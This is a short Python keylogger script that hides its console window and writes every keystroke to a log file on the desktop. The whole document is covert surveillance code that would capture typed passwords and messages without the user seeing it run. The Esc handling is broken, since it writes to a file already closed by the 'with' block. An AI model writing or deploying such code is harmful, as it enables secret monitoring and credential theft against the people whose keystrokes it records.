import os
import keyboard
import time
import ctypes

LOG_FILE_PATH = r"C:\Users\acer\OneDrive\Desktop\logs.txt.txt" # The path to the log file


def hide_console():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)


def log_key(key):
    special_keys = {
        "space": " ",
        "tab": "[TAB]",
        "enter": "[ENTER]",
        "esc": "[ESC]",
        "backspace": "[BACKSPACE]"
    }

    key_name = key.name
    log_entry = special_keys.get(key_name, key_name)

    with open(LOG_FILE_PATH, "a") as log_file:
        log_file.write(log_entry)

    if key_name == "esc":
        log_file.write("\nLogging stopped.\n")
        return False  # Stop the listener
    return True  # Continue logging


hide_console()

with open(LOG_FILE_PATH, "a") as log_file:
    log_file.write(f"\nThese are the keys that have been logged: {time.ctime()}\n")

keyboard.on_press(log_key)

keyboard.wait()
